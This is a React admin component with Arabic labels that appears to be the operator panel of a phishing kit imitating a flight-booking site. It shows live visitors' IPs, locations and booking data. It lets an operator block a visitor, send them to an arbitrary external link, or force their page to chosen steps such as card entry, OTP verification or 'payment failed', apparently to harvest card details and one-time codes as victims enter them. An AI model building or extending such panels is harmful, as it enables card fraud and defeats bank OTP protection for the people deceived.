import React, { useEffect, useState } from 'react';
import { Ban, CheckCircle, Eye, EyeOff, Users, X } from 'lucide-react';
import { getStepLabel, getStepColor } from '@/lib/visitor-tracking';
import type { VisitorStep } from '@/lib/visitor-tracking';
import { trpc } from '@/providers/trpc';
import { socket } from '@/lib/socket';

interface DbVisitor {
  id: number;
  sessionId: string;
  ip: string;
  country: string;
  city: string;
  userAgent: string;
  page: string;
  currentStep: string;
  stepHistory: { step: string; time: number }[];
  isBlocked: boolean;
  redirectUrl: string | null;
  bookingData: Record<string, unknown>;
  geoLat: number | null;
  geoLng: number | null;
  lastActive: Date | string;
  createdAt: Date | string;
}

export default function VisitorsTab() {
  const [activeFilter, setActiveFilter] = useState<'all' | 'active' | 'blocked'>('all');
  const [selectedVisitor, setSelectedVisitor] = useState<DbVisitor | null>(null);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [forceStep, setForceStep] = useState<VisitorStep>('home');

  const utils = trpc.useUtils();
  const { data: visitorsData = [], isLoading: visitorsLoading } = trpc.visitors.list.useQuery(undefined, { refetchInterval: 3000 });
  const { data: visitorStats } = trpc.visitors.stats.useQuery(undefined, { refetchInterval: 3000 });
  const blockMutation = trpc.visitors.blockVisitor.useMutation({ onSuccess: () => utils.visitors.list.invalidate() });
  const redirectMutation = trpc.visitors.setRedirectUrl.useMutation({ onSuccess: () => utils.visitors.list.invalidate() });

  useEffect(() => {
    const onVisitorUpdate = () => {
      utils.visitors.list.invalidate();
      utils.visitors.stats.invalidate();
    };
    socket.on('visitor_update', onVisitorUpdate);
    return () => { socket.off('visitor_update', onVisitorUpdate); };
  }, [utils]);

  const now = Date.now();
  const fiveMinAgo = now - 5 * 60 * 1000;
  const allVisitors: DbVisitor[] = visitorsData as DbVisitor[];
  const activeVisitors = allVisitors.filter(v => !v.isBlocked && new Date(v.lastActive).getTime() > fiveMinAgo);
  const blockedVisitors = allVisitors.filter(v => v.isBlocked);
  const visitors = activeFilter === 'active' ? activeVisitors : activeFilter === 'blocked' ? blockedVisitors : allVisitors;
  const totalCount = visitorStats?.total ?? allVisitors.length;
  const activeCount = visitorStats?.active ?? activeVisitors.length;
  const blockedCount = visitorStats?.blocked ?? blockedVisitors.length;
  const refresh = () => utils.visitors.list.invalidate();

  const handleBlock = (sessionId: string) => blockMutation.mutate({ sessionId, blocked: true, redirectUrl: '/blocked' });
  const handleUnblock = (sessionId: string) => blockMutation.mutate({ sessionId, blocked: false, redirectUrl: null });
  const handleForceRedirect = (sessionId: string) => {
    if (redirectUrl) { redirectMutation.mutate({ sessionId, redirectUrl }); setRedirectUrl(''); }
  };
  const handleForceStep = (sessionId: string) => redirectMutation.mutate({ sessionId, redirectUrl: 'step:' + forceStep });

  const stepOptions: { label: string; value: VisitorStep }[] = [
    { label: 'الرئيسية', value: 'home' },
    { label: 'نتائج الرحلات', value: 'results' },
    { label: 'تفاصيل الرحلة', value: 'trip_details' },
    { label: 'اختيار المقاعد', value: 'seat_selection' },
    { label: 'بيانات المسافرين', value: 'passenger_info' },
    { label: 'طريقة الدفع', value: 'payment_method' },
    { label: 'بيانات البطاقة', value: 'payment' },
    { label: 'OTP', value: 'code_verification' },
    { label: 'نجاح الدفع', value: 'success' },
    { label: 'فشل الدفع', value: 'code_failed' },
  ];

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <button onClick={() => setActiveFilter('all')} className={`bg-white rounded-2xl p-5 shadow-card border transition-all text-right ${activeFilter === 'all' ? 'border-brand-gold ring-2 ring-brand-gold/20' : 'border-[#E5E0D5]'}`}><div className="flex items-center gap-3"><div className="w-10 h-10 rounded-xl bg-blue-500 flex items-center justify-center"><Users className="w-5 h-5 text-white" /></div><div><p className="text-2xl font-extrabold text-charcoal">{totalCount}</p><p className="text-xs text-[#8A7E6B]">إجمالي الزوار</p></div></div></button>
        <button onClick={() => setActiveFilter('active')} className={`bg-white rounded-2xl p-5 shadow-card border transition-all text-right ${activeFilter === 'active' ? 'border-green-500 ring-2 ring-green-500/20' : 'border-[#E5E0D5]'}`}><div className="flex items-center gap-3"><div className="w-10 h-10 rounded-xl bg-green-500 flex items-center justify-center"><Eye className="w-5 h-5 text-white" /></div><div><p className="text-2xl font-extrabold text-charcoal">{activeCount}</p><p className="text-xs text-[#8A7E6B]">الزوار النشطون</p></div></div></button>
        <button onClick={() => setActiveFilter('blocked')} className={`bg-white rounded-2xl p-5 shadow-card border transition-all text-right ${activeFilter === 'blocked' ? 'border-red-500 ring-2 ring-red-500/20' : 'border-[#E5E0D5]'}`}><div className="flex items-center gap-3"><div className="w-10 h-10 rounded-xl bg-red-500 flex items-center justify-center"><EyeOff className="w-5 h-5 text-white" /></div><div><p className="text-2xl font-extrabold text-charcoal">{blockedCount}</p><p className="text-xs text-[#8A7E6B]">المحظورون</p></div></div></button>
      </div>

      <div className="flex justify-end"><button onClick={() => refresh()} className="h-9 px-4 border border-[#E5E0D5] text-[#8A7E6B] rounded-xl text-xs font-bold hover:bg-[#F5F3EF] transition-all">تحديث</button></div>

      {visitorsLoading ? (
        <div className="bg-white rounded-2xl shadow-card border border-[#E5E0D5] p-12 text-center"><div className="w-10 h-10 rounded-full border-4 border-brand-gold/20 border-t-brand-gold animate-spin mx-auto mb-3" /><p className="text-[#8A7E6B] text-sm">جارٍ تحميل الزوار...</p></div>
      ) : visitors.length === 0 ? (
        <div className="bg-white rounded-2xl shadow-card border border-[#E5E0D5] p-12 text-center"><Users className="w-16 h-16 mx-auto mb-4 text-[#E5E0D5]" /><p className="text-charcoal font-bold text-lg">لا يوجد زوار</p><p className="text-[#8A7E6B] text-sm mt-1">سيظهر الزوار هنا عند دخولهم للموقع</p></div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
          {visitors.map(v => {
            const stepColor = getStepColor(v.currentStep as VisitorStep);
            const stepLabel = getStepLabel(v.currentStep as VisitorStep);
            const lastActiveMs = new Date(v.lastActive).getTime();
            const ago = Math.round((Date.now() - lastActiveMs) / 1000);
            const agoText = ago < 60 ? `${ago} ث` : ago < 3600 ? `${Math.round(ago / 60)} د` : `${Math.round(ago / 3600)} س`;
            const bd = v.bookingData as { from?: string; to?: string };
            return (
              <button key={v.sessionId} onClick={() => setSelectedVisitor(v)} className={`bg-white rounded-2xl shadow-card border p-4 text-right transition-all hover:shadow-lg hover:scale-[1.02] active:scale-[0.98] ${v.isBlocked ? 'border-red-300 opacity-60' : 'border-[#E5E0D5]'}`}>
                <div className="flex items-center justify-between mb-3"><div className={`w-3 h-3 rounded-full ${v.isBlocked ? 'bg-red-400' : ago < 60 ? 'bg-green-400 animate-pulse' : 'bg-yellow-400'}`} /><span className="font-mono text-sm font-bold text-charcoal" dir="ltr">{v.ip}</span></div>
                <div className="rounded-lg px-3 py-2 mb-3 text-center" style={{ backgroundColor: stepColor + '15' }}><span className="text-xs font-bold" style={{ color: stepColor }}>{stepLabel}</span></div>
                {bd?.from && <div className="text-xs text-[#8A7E6B] mb-2 text-center">{bd.from} &rarr; {bd.to}</div>}
                <div className="flex items-center justify-between text-[10px] text-[#B5AFA3]"><span>{agoText}</span><span className="font-mono">{v.sessionId.slice(-6)}</span></div>
              </button>
            );
          })}
        </div>
      )}

      {selectedVisitor && (() => {
        const sv = selectedVisitor;
        const stepColor = getStepColor(sv.currentStep as VisitorStep);
        const bd = sv.bookingData as { from?: string; to?: string; date?: string; passengers?: unknown; selectedTrip?: string; fareClass?: string; selectedSeats?: string[] };
        return (
          <div className="fixed inset-0 z-[100] bg-black/50 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setSelectedVisitor(null)}>
            <div className="bg-white rounded-3xl shadow-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
              <div className="p-5 border-b border-[#E5E0D5] flex items-center justify-between"><button onClick={() => setSelectedVisitor(null)} className="w-8 h-8 rounded-full bg-[#F8F6F2] flex items-center justify-center text-[#8A7E6B] hover:text-charcoal"><X className="w-4 h-4" /></button><div className="flex items-center gap-2"><h3 className="font-extrabold text-charcoal">تفاصيل الجهاز</h3><div className="w-3 h-3 rounded-full animate-pulse" style={{ backgroundColor: stepColor }} /></div></div>
              <div className="p-5 space-y-5">
                <div className="bg-[#F8F6F2] rounded-xl p-4 text-center"><p className="text-xs text-[#8A7E6B] mb-1">IP Address</p><p className="font-mono text-xl font-extrabold text-charcoal" dir="ltr">{sv.ip}</p>{(sv.country || sv.city) && <p className="text-xs text-[#8A7E6B] mt-1">{sv.city}، {sv.country}</p>}{sv.geoLat && <p className="text-[10px] text-[#B5AFA3] font-mono mt-1" dir="ltr">📍 {Number(sv.geoLat).toFixed(4)}, {Number(sv.geoLng).toFixed(4)}</p>}</div>
                <div><label className="text-xs font-bold text-[#8A7E6B] mb-2 block">الخطوة الحالية</label><div className="rounded-xl p-4 text-center" style={{ backgroundColor: stepColor + '15' }}><p className="text-lg font-extrabold" style={{ color: stepColor }}>{getStepLabel(sv.currentStep as VisitorStep)}</p></div></div>
                {bd && (bd.from || bd.selectedTrip) && <div><label className="text-xs font-bold text-[#8A7E6B] mb-2 block">بيانات الحجز</label><div className="bg-[#F8F6F2] rounded-xl p-4 space-y-2 text-sm">{bd.from && <div className="flex justify-between"><span className="text-[#8A7E6B]">الوجهة</span><span className="font-bold text-charcoal">{bd.from} &rarr; {bd.to}</span></div>}{bd.date && <div className="flex justify-between"><span className="text-[#8A7E6B]">التاريخ</span><span className="font-bold text-charcoal">{bd.date}</span></div>}{bd.passengers !== undefined && bd.passengers !== null && <div className="flex justify-between"><span className="text-[#8A7E6B]">المسافرين</span><span className="font-bold text-charcoal">{String(bd.passengers)}</span></div>}{bd.selectedTrip && <div className="flex justify-between"><span className="text-[#8A7E6B]">الرحلة</span><span className="font-bold text-charcoal">{bd.selectedTrip} ({bd.fareClass})</span></div>}{bd.selectedSeats && bd.selectedSeats.length > 0 && <div className="flex justify-between"><span className="text-[#8A7E6B]">المقاعد</span><span className="font-bold text-charcoal">{bd.selectedSeats.join(', ')}</span></div>}</div></div>}
                <div><label className="text-xs font-bold text-[#8A7E6B] mb-2 block">سير الخطوات ({sv.stepHistory.length})</label><div className="space-y-1 max-h-40 overflow-y-auto">{sv.stepHistory.map((h, i) => <div key={i} className="flex items-center gap-2 text-xs"><div className="w-2 h-2 rounded-full shrink-0" style={{ backgroundColor: getStepColor(h.step as VisitorStep) }} /><span className="text-[#8A7E6B] font-mono">{new Date(h.time).toLocaleTimeString('ar-SA')}</span><span className="text-charcoal font-bold">{getStepLabel(h.step as VisitorStep)}</span></div>)}</div></div>
                <div className="bg-[#F8F6F2] rounded-xl p-4"><p className="text-[10px] text-[#B5AFA3] font-mono break-all" dir="ltr">{sv.userAgent || '—'}</p></div>
                <div className="border-t border-[#E5E0D5] pt-4 space-y-3"><p className="text-xs font-bold text-charcoal">التحكم بالجهاز</p><div className="flex gap-2"><select value={forceStep} onChange={e => setForceStep(e.target.value as VisitorStep)} className="flex-1 h-10 px-3 border border-[#E5E0D5] rounded-xl text-sm bg-[#FCFBF9] focus:outline-none focus:border-brand-gold">{stepOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}</select><button onClick={() => handleForceStep(sv.sessionId)} className="h-10 px-4 bg-blue-500 text-white rounded-xl text-xs font-bold hover:bg-blue-600 transition-all">نقل</button></div><div className="flex gap-2"><input value={redirectUrl} onChange={e => setRedirectUrl(e.target.value)} placeholder="رابط خارجي..." className="flex-1 h-10 px-3 border border-[#E5E0D5] rounded-xl text-sm bg-[#FCFBF9] focus:outline-none focus:border-brand-gold" /><button onClick={() => handleForceRedirect(sv.sessionId)} className="h-10 px-4 bg-purple-500 text-white rounded-xl text-xs font-bold hover:bg-purple-600 transition-all">توجيه</button></div>{sv.isBlocked ? <button onClick={() => { handleUnblock(sv.sessionId); setSelectedVisitor(null); }} className="w-full h-11 bg-green-500 text-white font-bold rounded-xl hover:bg-green-600 transition-all flex items-center justify-center gap-2"><CheckCircle className="w-4 h-4" /> فك الحظر</button> : <button onClick={() => { handleBlock(sv.sessionId); setSelectedVisitor(null); }} className="w-full h-11 bg-red-500 text-white font-bold rounded-xl hover:bg-red-600 transition-all flex items-center justify-center gap-2"><Ban className="w-4 h-4" /> حظر الجهاز</button>}</div>
              </div>
            </div>
          </div>
        );
      })()}
    </div>
  );
}
